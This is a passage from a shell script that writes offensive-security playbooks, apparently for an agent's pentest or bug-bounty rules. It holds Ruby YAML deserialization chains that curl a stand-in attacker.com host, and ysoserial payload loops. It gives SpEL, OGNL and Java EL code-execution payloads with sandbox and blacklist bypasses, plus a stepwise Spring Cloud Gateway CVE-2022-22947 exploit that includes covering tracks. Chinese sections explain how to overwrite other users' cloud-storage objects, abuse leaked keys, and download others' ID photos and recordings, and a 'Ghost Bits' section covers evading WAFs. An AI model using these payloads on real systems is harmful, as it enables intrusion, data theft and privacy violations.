`YAML.load` in Ruby constructs arbitrary Ruby objects via `!ruby/object:` tags. It is equivalent to `Marshal.load` or Java's `ObjectInputStream.readObject()` in terms of attack surface.

### 5.2 Version-Specific Exploits

**Ruby ≤ 2.7.2** — `Gem::Requirement` chain (simplest):

```yaml
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::DependencyList
  specs:
    - !ruby/object:Gem::Source
      current_fetch_uri: !ruby/object:URI::Generic
        path: "| curl http://attacker.com/pwned"
```

**Ruby 2.x–3.x** — `Gem::Installer` chain (complex but broader):

```yaml
--- !ruby/hash:Gem::Installer
i: x
--- !ruby/hash:Gem::SpecFetcher
i: y
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
      read: 0
      header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
      socket: &1 !ruby/object:Gem::RequestSet
        sets: !ruby/object:Net::WriteAdapter
          socket: !ruby/module 'Kernel'
          method_id: :system
        git_set: "curl http://attacker.com/$(whoami)"
      method_id: :resolve
```

### 5.3 Detection in the Wild

```ruby
# Vulnerable patterns in source code:
YAML.load(user_input)
YAML.load(File.read(user_controlled_path))
YAML.load(params[:config])

# Safe alternatives:
YAML.safe_load(input)
YAML.safe_load(input, permitted_classes: [Symbol, Date])
Psych.safe_load(input)
```

### 5.4 Psych YAML Parser Versions

| Ruby Version | Psych Version | YAML.load Behavior |
|---|---|---|
| ≤ 2.0 | Psych 2.x | Arbitrary object construction |
| 2.1–2.7 | Psych 3.x | Arbitrary (YAML.load deprecated warning in 2.6+) |
| 3.0 | Psych 3.3 | YAML.load warns, still works |
| 3.1+ | Psych 4.0 | YAML.load defaults to safe_load behavior; need `unsafe_load` |

---

## 6. DETECTION FINGERPRINTS — MAGIC BYTES TABLE

### 6.1 By Protocol / Format

| Magic Bytes (Hex) | Base64 Prefix | Format | Language |
|---|---|---|---|
| `AC ED 00 05` | `rO0AB` | Java Serialized Object | Java |
| `00 01 00 00 00 FF FF FF FF` | `AAEAAAD/////` | .NET BinaryFormatter | .NET |
| `FF 01` | `/w` | .NET ObjectStateFormatter (ViewState) | .NET |
| `80 02` or `80 03` or `80 04` or `80 05` | Varies | Python pickle (protocol 2/3/4/5) | Python |
| `89 50 4E 47` | `iVBOR` | PNG (may contain phar polyglot) | PHP |
| `4F 3A` | `Tz` (base64 of `O:`) | PHP serialized object (`O:N:"Class"`) | PHP |
| `61 3A` | `YT` (base64 of `a:`) | PHP serialized array (`a:N:{`) | PHP |
| `04 08` | Varies | Ruby Marshal | Ruby |
| `1F 8B` | `H4s` | Gzip (may wrap serialized data) | Any |
| `48 02` or `63` | Varies | Hessian (2.0 / 1.0) | Java |

### 6.2 By Content-Type Header

| Content-Type | Likely Format | Risk |
|---|---|---|
| `application/x-java-serialized-object` | Java ObjectOutputStream | Critical |
| `application/x-java-serialized-object-xml` | XMLEncoder/XMLDecoder | Critical |
| `x-application/hessian` | Hessian binary | Critical |
| `application/x-hessian` | Hessian binary | Critical |
| `application/x-amf` | AMF (Flash) — often wraps Java | High |
| `application/x-yaml` / `text/yaml` | YAML (check for `!!` tags) | High (if YAML.load) |
| `application/java-archive` | JAR file | Context-dependent |
| `application/x-protobuf` | Protobuf (generally safe) | Low |
| `application/json` with `$type` | JSON.NET with TypeNameHandling | Critical |
| `application/xml` with suspicious elements | XStream / XMLDecoder | Critical |

### 6.3 By Cookie / Parameter Name

| Name Pattern | Likely Format | Product |
|---|---|---|
| `rememberMe` | Java serialized + AES | Apache Shiro |
| `__VIEWSTATE` | .NET ObjectStateFormatter | ASP.NET WebForms |
| `__EVENTTARGET` | .NET (associated with ViewState) | ASP.NET WebForms |
| `JSESSIONID` + binary cookie | Java serialized | Various Java servers |
| `rack.session` | Ruby Marshal (base64) | Ruby on Rails / Rack |
| `_session_id` + binary | Python pickle or JSON | Django / Flask |
| `connect.sid` | Node.js session (usually JSON, but check) | Express |
| `ci_session` | PHP serialized | CodeIgniter |
| `PHPSESSID` + serialized data | PHP serialized | PHP applications |

### 6.4 Quick Identification Script

```bash
# Check if base64-decoded data matches known magic bytes:
echo "BASE64_DATA" | base64 -d | xxd | head -1

# Java: look for "ac ed 00 05"
# .NET BinaryFormatter: look for "00 01 00 00 00 ff ff ff ff"
# Python pickle: look for "80 0N" where N is protocol version
# PHP: decode and look for "O:" or "a:" prefix
```

---

## 7. TOOLING QUICK REFERENCE

| Tool | Language | Purpose |
|---|---|---|
| **ysoserial** | Java | Java gadget chain payload generation |
| **ysoserial.net** | .NET | .NET gadget chain payload generation |
| **marshalsec** | Java | Hessian, XStream, JNDI, multiple format payloads |
| **PHPGGC** | PHP | PHP gadget chain generation (Laravel, Symfony, etc.) |
| **pimpmykali/ysoserial-modified** | Java | Extended ysoserial with more chains |
| **GadgetInspector** | Java | Automated gadget chain discovery in classpaths |
| **Blacklist3r** | .NET | ViewState key testing and forging |
| **SerializationDumper** | Java | Decode and inspect Java serialized objects |
| **jdeserialize** | Java | Parse Java serialization stream for analysis |

```bash
# ysoserial — try all chains with DNS callback:
for chain in CommonsCollections1 CommonsCollections2 CommonsCollections3 \
  CommonsCollections4 CommonsCollections5 CommonsCollections6 \
  CommonsCollections7 CommonsBeanutils1 Spring1 Spring2 \
  Groovy1 Hibernate1 Jdk7u21 URLDNS; do
  java -jar ysoserial.jar $chain "http://${chain}.TOKEN.collab.net" 2>/dev/null | \
    base64 -w0 > "${chain}.b64"
  echo "Generated: ${chain}"
done
```
TECH_DESERIALIZATION_TEST_EOF

seed_rule techniques/dns-rebinding-test.md <<'TECH_DNS_REBINDING_TEST_EOF'
# dns-rebinding-test（几乎不交）

> 单独 DNS 重绑定不交。SSRF 过滤绕过走 `ssrf-test.md`。
TECH_DNS_REBINDING_TEST_EOF

seed_rule techniques/el-injection-test.md <<'TECH_EL_INJECTION_TEST_EOF'
# expression-language-injection

# Expression Language Injection


## 1. DETECTION — POLYGLOT PROBES

```text
${7*7}              → 49 = SpEL, OGNL, or Java EL
#{7*7}              → 49 = SpEL (alternative syntax) or JSF EL
%{7*7}              → 49 = OGNL (Struts2)
${T(java.lang.Math).random()}  → random float = SpEL confirmed
%{#context}         → object dump = OGNL confirmed
```

### Disambiguation

| Response to `${7*7}` | Response to `%{7*7}` | Engine |
|---|---|---|
| 49 | literal `%{7*7}` | SpEL or Java EL |
| literal `${7*7}` | 49 | OGNL (Struts2) |
| 49 | 49 | Both may be active |

---

## 2. SpEL (SPRING EXPRESSION LANGUAGE)

### Where SpEL Appears

- `@Value("${...}")` annotations
- Spring Security expressions (`@PreAuthorize`)
- Spring Cloud Gateway route predicates and filters
- Thymeleaf `th:text="${...}"` (when combined with `__${...}__` preprocessing)
- Spring Data `@Query` with SpEL

### RCE via Runtime.exec

```java
${T(java.lang.Runtime).getRuntime().exec("id")}
```

### RCE with Output Capture (Commons IO)

```java
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("id").getInputStream())}
```

### RCE with Output Capture (Spring StreamUtils)

```java
#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()))}
```

### ProcessBuilder (alternative when Runtime is blocked)

```java
${new java.lang.ProcessBuilder(new String[]{"id"}).start()}
```

### Spring Cloud Gateway — CVE-2022-22947

Exploit via actuator to add malicious route with SpEL filter:

```bash
# Step 1: Add route with SpEL in filter (with output capture)
POST /actuator/gateway/routes/hacktest
Content-Type: application/json
{
  "id": "hacktest",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()))}"
    }
  }],
  "uri": "http://example.com",
  "predicates": [{"name": "Path", "args": {"_genkey_0": "/hackpath"}}]
}

# Step 2: Refresh routes to apply
POST /actuator/gateway/refresh

# Step 3: Trigger the route
GET /hackpath
# Response header "Result" contains command output

# Step 4: Clean up (important for stealth)
DELETE /actuator/gateway/routes/hacktest
POST /actuator/gateway/refresh
```

### SpEL Sandbox Bypass

When `SimpleEvaluationContext` is used (restricts `T()` operator):

```java
// Try reflection-based bypass:
${''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}
```

---

## 3. OGNL (OBJECT-GRAPH NAVIGATION LANGUAGE)

### Where OGNL Appears

- Apache Struts2 — primary OGNL consumer
- Confluence Server — uses OGNL in certain request paths
- Any Java app using `ognl.Ognl.getValue()` or `ognl.Ognl.setValue()`

### Basic RCE

```
%{(#cmd='id').(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec(#cmd))}
```

### Struts2 Sandbox Bypass — _memberAccess Manipulation

Struts2 restricts OGNL via `SecurityMemberAccess`. Classic bypass clears restrictions:

```
%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

### Struts2 OgnlUtil Blacklist Clear

Later Struts2 versions use class/package blacklists. Bypass by clearing `excludedClasses` and `excludedPackageNames`:

```
%{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(#cmd='id').(#rt=@java.lang.Runtime@getRuntime().exec(#cmd))}
```

### Key Struts2 CVEs

| CVE | Vector | Payload Location |
|---|---|---|
| S2-045 (CVE-2017-5638) | Content-Type header | `%{...}` in Content-Type |
| S2-046 (CVE-2017-5638) | Multipart filename | OGNL in upload filename |
| S2-016 (CVE-2013-2251) | `redirect:` / `redirectAction:` prefix | URL parameter |
| S2-048 (CVE-2017-9791) | Struts Showcase | ActionMessage with OGNL |
| S2-057 (CVE-2018-11776) | Namespace OGNL | URL path |

### Confluence OGNL — CVE-2021-26084

Confluence Server allows OGNL injection via the `queryString` or action parameters:

```bash
POST /pages/createpage-entervariables.action
Content-Type: application/x-www-form-urlencoded

queryString=%5cu0027%2b%7b3*3%7d%2b%5cu0027
# URL-decoded: \u0027+{3*3}+\u0027
# If response contains 9 → confirmed
# Escalate to Runtime.exec for RCE
```

---

## 4. JAVA EL (JSP / JSF)

### Where Java EL Appears

- JSP pages: `${expression}` and `#{expression}`
- JSF (JavaServer Faces): value and method bindings
- Custom tag libraries

### RCE Payloads

```java
// Java EL with Runtime:
${Runtime.getRuntime().exec("id")}

// Via pageContext (JSP):
${pageContext.request.getServletContext().getClassLoader()}

// Reflection-based:
${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}
```

---

## 5. DETECTION METHODOLOGY

```
Input reflected and ${7*7} returns 49?
├── Java application?
│   ├── Struts2? → Try %{...} OGNL payloads
│   │   └── Check Content-Type injection (S2-045)
│   ├── Spring? → Try T(java.lang.Runtime) SpEL
│   │   └── Check /actuator/gateway (Spring Cloud Gateway)
│   ├── Confluence? → Try OGNL via action parameters
│   └── JSP/JSF? → Try Java EL payloads
│
├── Error messages reveal framework?
│   ├── "ognl.OgnlException" → OGNL
│   ├── "SpelEvaluationException" → SpEL
│   └── "javax.el.ELException" → Java EL
│
└── Blocked by sandbox?
    ├── OGNL: clear _memberAccess / excludedClasses
    ├── SpEL: reflection bypass for SimpleEvaluationContext
    └── Try alternative exec methods (ProcessBuilder, ScriptEngine)
```

---

## 6. QUICK REFERENCE

```text
# SpEL RCE:
${T(java.lang.Runtime).getRuntime().exec("id")}

# OGNL RCE (Struts2):
%{(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))}

# OGNL with sandbox bypass:
%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))}

# Java EL RCE:
${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}

# Confluence CVE-2021-26084 probe:
queryString=\u0027%2b{3*3}%2b\u0027

# Spring Cloud Gateway CVE-2022-22947:
POST /actuator/gateway/routes/x  → SpEL in filter args
POST /actuator/gateway/refresh
```
TECH_EL_INJECTION_TEST_EOF

seed_rule techniques/email-header-injection-test.md <<'TECH_EMAIL_HEADER_INJECTION_TEST_EOF'
# email-header-injection-test（几乎不交）

> 邮件头注入没进号/没改密默认不写。重置链走 `authbypass-test.md` + `http-host-header-test.md`。
TECH_EMAIL_HEADER_INJECTION_TEST_EOF

seed_rule techniques/file-upload-test.md <<'TECH_FILE_UPLOAD_TEST_EOF'
> 写不写只认 `rules/srcskill/vuln-report-format.md`。本篇是测法：别停在能传能下，跟可执行/路径/SSRF/跨用户业务对象。
> 短表指针用标题搜。PHP 马 / GIFAR / ImageTragick / 英文附件已砍；没对象存储不要空打跨桶。

# 文件上传漏洞测试手册

## 测试流程（开场）

找上传点（头像/附件/导入/富文本）→ 先传正常文件看路径、是否重命名、落 CDN/OSS 还是本机、能不能直接打开。别停在能传能下：跟覆盖他人对象、带签读、可执行/路径/SSRF。后缀/Content-Type/解析绕过现场按栈自己变。

### STS / 对象 key 通配覆盖（短表有指针）

认：对象存储（BOS/OSS/S3/TOS 一类）上传先申请 STS/预签名；对象 key 常是文件 md5；桶名按日期或批次递增。或 assumerole 一类领钥匙口，请求里的 `filename` / `Action` 会被拿去拼 Policy。下面 xluser / AES / `1.jpg` 是常见皮，**没有这字仍打通配**。

打：

1. 申请凭证的 `identifier` / `key` / `object` / `prefix` / `filename` **长度不校验**时，试 `*`、`**`，再试**置空**和 `/`（有的实现空前缀 = 整桶）  
2. 一个 `*` 可能落到空桶；**两个以上**可能命中当前业务桶，凭证 `key` 变成通配当前桶  
3. path / `actionName` / 拼进 Policy 的路径参试 `../../../`、`../../../&/../../`，看签出来的范围是不是扩到根  
4. 别人文件的对象 key 往往是 md5：打开文档页，在 JS/接口里搜 `md5sum` / `md5`，不用下载、不用付费  
5. 用刚领到的 STS，把上传 path 设成对方那个 md5，覆盖对象  
6. assumerole 另打一枪：`filename=*-*`（或 `*`）、`Action=*`。有的实现是**后段 Policy 盖前段**，钥匙变成整桶。通了先 `list_objects`，再删/盖列出来的 key。**List/Delete 403 别停**：对任意 key GET/PUT。领钥 XHR 不带登录头也打。**sibling drive 匿名票 `illegal user id` 不等于本网关也拒**：匿名 xluser 票过闸的 STS 口照打。query `upload_dir`/`dir` 原样进 OSS Policy 时填 `*`。页面走 CDN 时，强制刷新或等缓存过完再验收  
7. PUT 时头里试 `x-cos-acl: public-read`、`x-cos-grant-full-control: id="你的UIN"`（OSS/S3 对等头一样）。**对象真变成公有读、或控制权到你的 UIN** 才算；只 200 不算接管
8. 没有「文件已存在」预言时仍猜短原文件名（`1.jpg`/`2.png`/`5.jpg`）匿名 GET CDN。token 口若前端写死 AES/盐，未登录自己算 sign，`filename=*` 常直接下发 appId+bucket，CDN 前缀拼出来就能下**他人证件照**  
9. **落地页写死 supabase / nocode `role=anon` JWT 时，rest 表 CRUD 不是终点。** 带 `apikey` + `Authorization: Bearer` 打 `POST /storage/v1/object/{桶}/{官方前缀/探测key}`。官方封面/案例图常在 `use-cases/`、`covers/` 一类前缀。第一次 POST 自己的探测文件；同一对象名再 POST，头加 `x-upsert: true`，正文改成另一串标记。公开 `GET /storage/v1/object/public/{桶}/{key}` 对照两次正文。**不要真盖官方运营图**，同前缀能盖自己刚传的 = 官方同前缀同样能盖。打完 DELETE 探测文件。rest `/rest/v1/` 403 别停，存储 REST 常另开。

算成：再打开/下载**对方那篇/那张图**，内容变成你传的；或 list 出别人的 key 并能删/盖；或官方前缀上 `x-upsert` 把探测文件盖成第二串标记（同前缀官方对象同一把钥）。只证明自己能传到自己的 key → 假点。

假点：`*` 只签发废桶；通配了但覆盖 403；改的是自己的对象；策略服务端写死盖不掉；只通自己前缀；CDN 一直不刷新看起来没盖上。单站没中不删短表这行。

和 S3 预签名「改自己的 Content-Type」、和「带签 URL 改租户读他文件」、和下面「桶策略对匿名全开」「签名没绑 Host」「签名覆盖 Content-Type」都不是一条：本条是 **凭证范围被通配成整桶，覆盖或清掉他人对象**。

### 签名没绑 Host（短表有指针）

认：COS / OSS / S3 带签 URL；query 里 `q-header-list`、`SignedHeaders`、`X-Amz-SignedHeaders` **没有 host**。有对象存储带签才打，没有不要空换域名。

打：

1. 看签名参数里签了哪些头。没有 `host` 再往下。  
2. 把 URL 的主机换成**同账号另一个桶**的域名（证书 SAN、报错、控制台、JS 里抄），path 和签名 query 先不动。  
3. 再加 `?uploads`（或已有 query 后 `&uploads`）打 ListMultipartUploads；能 GET 对象也打。

算成：列出或读到**别的桶**里的对象。只换域还是自己这个桶 → 没成。

假点：签名罩住 Host；换域 403；只有自己这个桶。单站没中不删短表这行。

和 STS `*`（钥匙范围被通配）、和带签 URL 只改租户字段 **不是一条**：本条是 **Host 没进签名，同一把签能打到别的桶**。

### 签名覆盖 Content-Type（短表有指针）

认：对象内容你能控（自己传的或 STS 能盖的）；对象上的 Content-Type 被卡死（image/jpeg 一类）；手里有临时钥或能再出预签名。

打：

1. 上传时改 CT 那一枪还打（`text/HtMl`、`text/html,image/png`）。那是「签的时候没把 CT 签进去」。  
2. **事后再签**：用临时钥给**已有对象**出一枪带 `response-content-type=text/html`（COS/OSS 支持签名覆盖响应头）的 GET。  
3. 用这把新签 URL 在浏览器打开，不要只看 curl 的 Content-Type。

算成：浏览器当 HTML 执行（存储 XSS）。下载仍是附件/原 CT → 没成。

假点：签名接口拒这个参；只能改自己不可达的对象；`X-Content-Type-Options: nosniff` 且 CT 仍是图。单站没中不删短表这行。没对象存储、没临时钥不要空签。

和「上传 PUT 时改 Content-Type」不是一条：那条改的是**写入时**的类型；本条是 **读的时候用签名把响应头盖成 HTML**。

### webpack 明文对象存储永久钥（短表有指针）

认：管理台 / 运营后台 webpack 把生产 `accessKeyId`+`secretAccessKey`（MSS / S3 一类永久钥）打进 JS。或 Weblogic `/console/login/LoginForm.jsp` 内联 `_reportCfg` 一类的 `SRV_` 钥。上传签 `getUploadSign` 是前端 HMAC-SHA1 算 policy，不是走登录后的 STS 口。policy 里 `starts-with $key` 经常是空串。

打（不登录）：

1. 抄 online/prod 的 AK/SK（实值只进报告）  
2. 自己算 POST policy，expiration 拉长，`starts-with $key` 按 JS 原样（空就空）  
3. POST 桶：对照假签 `SignatureDoesNotMatch`、无签 `conditions has no signature`  
4. 任意 key PUT 后 CDN GET；DELETE 自己刚传的证明钥能写。官方页面已经引用的对象试覆盖  
5. List/PUT 403 别停：先 `GetBucketLocation`。对照假 AK `InvalidAccessKeyId`。页面桶名拼错（staic/static）试邻近  

算成：完整永久云钥能签（真签 PUT 200 或 GetBucketLocation 出地域）。能盖官方已有对象更稳。

假点：InvalidAccessKeyId；只能传到固定前缀；getUploadSign 其实是 SSO 接口没有本地钥；钥过期。密钥实值不进库。单站没中不删短表这行。

和 STS 通配（先申请临时票）、和桶策略对匿名全开（不用钥）、和 viewer XOR 藏 COS 永久钥（要解开再问 AccountId）都不是一条：本条是 **webpack 明文永久钥 + 前端自己算签**。

### 桶策略对匿名全开（短表有指针）

认：官网/控制台的图、使用指南、协议直接挂在 OSS / cloudrun 一类桶域名上；桶根或 `?policy` / GetBucketPolicy / 等价策略接口能拉开，语句是全 Allow。

打：

1. 策略能看就看；再对桶做 LIST（无 AK）  
2. 对**已经在官网上引用的对象**试 PUT / 覆盖（不要去改桶策略本身）  
3. 指南、协议、站点图优先；盖完用原来的官方 URL 打开验收  

算成：官方那份指南/协议/图的内容变成你传的。只证明匿名能 LIST、或只能传到一个没人引用的新 key → 假点。

假点：策略只读不能写；PUT 只能落自己前缀；下到的本来就是公开静态页。单站没中不删短表这行。

和 STS `*`（要先申请凭证、key 打成通配）、和 filename `../` 穿越租户目录、和 Azure 容器级 SAS 都不是一条：本条是 **桶策略对匿名放开，不用凭证**。

### 存储代理 sign key=/（短表有指针）

认：业务网关把对象存储代理成 `/api/storage/sign`（或同类 sign），query 只吃 `key`。`key=/` 或 `key=.` 回 S3 `ListBucketResult` XML，不是申请 STS。

打（不登录）：

1. GET `?key=/`（再试 `.`）。对照乱填 key 应 `NoSuchKey` / 400  
2. 列表里抄业务前缀（`images/` `editor-` 一类）再 GET 同一口  
3. 看对象是不是未公开素材，不要停在官网 Banner  

算成：列出并读到他人未公开对象原文。

假点：只有 app-static 公开静态；`filename=` 400 当没口。单站没中不删短表这行。和 STS 通配（先领钥）、桶策略匿名全开（直打桶域）不是一条：本条是 **业务网关自己当 List/Get 代理**。


### 制品下载详情把 uin 有无当登录闸（短表有指针）

认：软件/专有云/物料下载中心；详情 JSON 有 `DownloadURL`；前端从 Cookie 抄 `uin`/`skey` 拼 query。空身份时 URL 是空串、页面跳登录。

打：不登录 GET 详情，身份字段填非空假值（`uin=1`），不要 skey。对照空 uin。拿回的带签 URL Range GET 前几十字节看 ELF/PK。

算成：专有云安装包/内部部署文档真文件。空 uin 也出 URL → 完全无鉴权（另一条）。带签 403 / 只有公开说明书 → 没成。

### 入驻 JS 写死 fileKey（短表有指针）

认：入驻/资质 SPA 打包 JS 的 mock 或演示 formData 写死一长串密文 `fileKey`。站点根 301 到新域，**旧 host 下载口可能还活**。不要把 mock 当占位丢掉，也不要把 301 当整站废。

打（不登录）：

1. 跟新域 chunk 抄 `fileKey`  
2. 打旧 host `/json/view/file/downloadFile?fileKey=`（或同类）  
3. 对照：乱填 fileKey 应空/错，真 key 出图  

算成：私有桶执照/证件原图真下到。

假点：把 301 新域名当整站废；mock fileKey 当下占位且乱填也出同一张图。单站没中不删短表这行。密钥实值、完整 JS 不进本篇。

### 分享鉴权 false 仍下媒体（短表有指针）

认：云录制分享；鉴权接口有 `download_enable`/`view_minutes_enable`。或会议 JSON 网关根本没有 `permission/auth`（404 别停）。

打（不登录）：

1. `download-multi-record-file` **和** `sign-multi-record-file` 都打（要 `auth_share_id`+`resource_type`）。国际 JSON 网关缺 `sharing_id` 只回 `2710500 参数非法`，`auth_share_id` 和 `sharing_id` 一起带才签发 MP4；缺了会当没洞。**POST JSON 报「录制 id 不能为空」别停，改 GET query 把 record_id / auth_share_id 放进 URL。**  
2. 没有鉴权口不要当成没入口：直接打 `public/record-detail/download-multi-record-file`。  
3. 纪要/时间线 `get-full-summary` / `query-timeline` 只填 `record_id` 也试，不要默认必须带 share。  
4. COS 无 Referer 的 403 **不是终点**：带分享页 Referer 再 GET。  
5. `permission/get-cfg` 看会不会吐同会其它 record。  
6. 只拿到 url 没 GET 到 MP4 算半条，继续跟。  

算成：鉴权写 false 仍拉到真 MP4（ftypisom+体积）；或只要 record_id 出纪要全文（不是标题）。

假点：鉴权真拦了、下不到文件；只有公开说明书；纪要只要标题没有正文。单站没中不删短表这行。

### 密码分享回包带明文提取码（短表有指针）

认：分享详情 JSON 一边 `need_pwd` / `auth_level`（或同类）表示要提取码，一边 auth 对象把明文提取码放进 `pass_word`（或同类）。或落地 HTML / `syncData` 内联同一明文码。

打（不登录）：

1. 先空着提取码打查看口。对照：文件列表应空，闸字段应是要码。  
2. 同一份回包里抄明文码，填回查看口。对照：空密时列表空、填了才出 `file_id`。  
3. **落地 HTML / `syncData` 里已经有明文 `pass_word` 就直接抄**，不必先打 View CGI。  
4. 拿 `file_id` 和这份码打下载口，跟到真文件头（PDF/ZIP 一类正文），不要停在 JSON 有码。

算成：拿到提取码并下到密码分享正文，不是空密直接出文件列表。

假点：`pass_word` 是哈希抄了登不进；空密 View 已经出文件（那是无提取码分享，不是这枪）。单站没中不删短表这行。
密钥实值、完整 JS 不进本篇。
TECH_FILE_UPLOAD_TEST_EOF

seed_rule techniques/ghost-bits-cast-test.md <<'TECH_GHOST_BITS_CAST_TEST_EOF'
# ghost-bits-cast-attack

# Ghost Bits / Cast Attack — Java char to byte Narrowing Playbook


## 1. ONE-MINUTE MENTAL MODEL

Java's `char` is a **16-bit** unsigned integer (UTF-16 code unit). Almost
every wire protocol — HTTP/1.1, SMTP, Redis RESP, file paths, raw byte
streams — is **8-bit** byte oriented. The right way to bridge them is
explicit charset encoding:

```
// Correct: explicit UTF-8, multi-byte chars become multi-byte sequences
byte[] bytes = str.getBytes(StandardCharsets.UTF_8);
out.write(bytes);
```

Tons of legacy code, framework internals, and "fast path" optimizations skip
this and silently narrow:

```
// Dangerous: high 8 bits silently dropped
byte b = (byte) ch;          // 0x966A -> 0x6A
out.write(ch);               // ByteArrayOutputStream.write(int) keeps low 8 bits
dos.writeBytes(str);         // DataOutputStream loops char->byte cast
int v = ch & 0xFF;           // explicit low-byte mask
```

The lost high 8 bits are the **Ghost Bits**. They turn a multi-byte
Unicode character into a single attacker-chosen ASCII byte at the protocol
layer.

```
View A (string layer: WAF / business validation / logs)
  sees: 陪 阮 严 灵 瘍 瘊 ...   "harmless Unicode garbage, allow"
                  |
                  v       silent narrowing somewhere in the call stack
View B (byte layer: protocol / file system / parser / class loader)
  sees: j  .  %  u  \r \n ...  "executes the dangerous semantics"

The boundary is breached at the exact moment "view A" and "view B" disagree.
```

Mathematical formulation: to make View B see byte `T`, pick any
`k in 0x01..0xFF` and use:

```
c = chr((k << 8) | T)
```

That gives you **255 candidate Unicode characters per dangerous byte** —
plenty of room to dodge any signature-based blacklist.

---

## 2. THREE ROOT-CAUSE FAMILIES

The Ghost Bits umbrella covers three distinct underlying bugs. Distinguishing
them tells you both *which payload shape* to send and *what to grep for* in
source.

### Family A — Real high-bit truncation (classic Ghost Bits)

The narrowing is literal and unconditional.

```java
// Pattern A1: explicit cast
byte b = (byte) ch;

// Pattern A2: bitwise mask
int v = ch & 0xFF;
int v = ch & 255;

// Pattern A3: OutputStream.write(int) keeps low 8 bits only
out.write(ch);
baos.write(ch);

// Pattern A4: DataOutputStream.writeBytes(String) iterates chars,
//             writing low byte of each
dos.writeBytes(str);

// Pattern A5: deprecated APIs that still exist in old code
String.getBytes(int srcBegin, int srcEnd, byte[] dst, int dstBegin);
new StringBufferInputStream(str);
raf.writeBytes(str);
```

Typical impact: Tomcat `filename*`, Apache BCEL ClassLoader, Lettuce Redis
writer, SMTP CRLF in Angus Mail, HTTPCLIENT-1974 header injection.

### Family B — Bit-arithmetic folding (illegal char becomes legal)

A "fast" hex / base64 / charset decoder uses bit tricks instead of strict
range checks, so an illegal character collapses onto a legal one.

```java
// Jetty TypeUtil.fromHexDigit (simplified)
private static int fromHexDigit(char c) {
    int x = c & 0x1F;          // keep low 5 bits
    x += (c >> 6) * 25;
    x -= 16;
    return x;                  // expected 0..15, but no range check
}
```

Worked example: feed `>` (0x3E):

```
0x3E & 0x1F = 0x1E = 30
(0x3E >> 6) * 25 = 0
30 + 0 - 16 = 14 = 0xE
```

So `%2>` is silently parsed as `%2E` = `.`. The same algebra makes `%2^`,
`%2~` etc. equivalent to other hex digits.

Typical impact: Openfire CVE-2023-32315, GeoServer CVE-2024-36401, generic
URL-decode WAF bypass.

### Family C — Lax Unicode normalization

The decoder accepts Unicode characters that happen to be classified as
"digit" or that map to a hex value via a `& 0xFF` lookup — even though they
were never meant to participate in protocol parsing.

```java
// Fastjson: too permissive
Character.digit(c, 16);   // accepts Thai, Punjabi, fullwidth digits

// Jackson: index by low 8 bits into an ASCII-only table
return sHexValues[ch & 0xff];

// Generic: fullwidth normalization
// '2' (U+FF12) -> '2', 'e' (U+FF45) -> 'e'
```

Typical impact: Fastjson `\u` and `\x` escape bypass, fullwidth URL-encoded
path traversal, Jackson `charToHex` SQLi smuggling.

---

## 3. CHARACTER GENERATOR

Build any Ghost Bits character on the fly. This is the single function every
agent should keep in mind:

```python
# Python
def ghost(target_byte: int, k: int = 1) -> str:
    """Return a Unicode char whose low 8 bits equal target_byte."""
    return chr(((k & 0xFF) << 8) | (target_byte & 0xFF))

# 255 candidates per byte, e.g. for '.' (0x2E):
candidates = [ghost(0x2E, k) for k in range(1, 256)]
# 阮(U+962E), Ⱦ?-prefixed-..., etc.
```

```yak
// Yaklang (for poc.HTTP / fuzz)
func ghost(targetByte, k) {
    return string(rune(((k & 0xFF) << 8) | (targetByte & 0xFF)))
}
ghostJ = ghost(0x6A, 0x96)   // returns "陪"
```

Selection guidance:

- Avoid surrogate range `0xD800..0xDFFF` (high byte 0xD8..0xDF) — those are
  not valid scalar values and will be replaced by the JVM string decoder
  before reaching the narrowing site, defeating the bypass.
- Prefer characters that survive the application's own charset round-trip
  (Latin-Extended, CJK Unified Ideographs, Enclosed CJK Letters and Months,
  Hangul). If the request body uses UTF-8, these all encode cleanly into
  multi-byte sequences that no WAF rule recognizes as `.`, `/`, `j`, etc.
- Rotate `k` between requests so signature based learning cannot pin a single
  character to a single attack.

---

## 4. DANGEROUS-BYTE TO GHOST-CHARACTER MAP

Compact red-team weaponization table. For every byte the attacker actually
needs, one verified Unicode char is given; substitute another `k` if the WAF
later learns the example.

| Target byte | Hex  | Used for                              | Ghost char | Code point |
|-------------|------|---------------------------------------|------------|------------|
| `\t`        | 0x09 | header folding, parser confusion      | `ĉ`        | U+0109     |
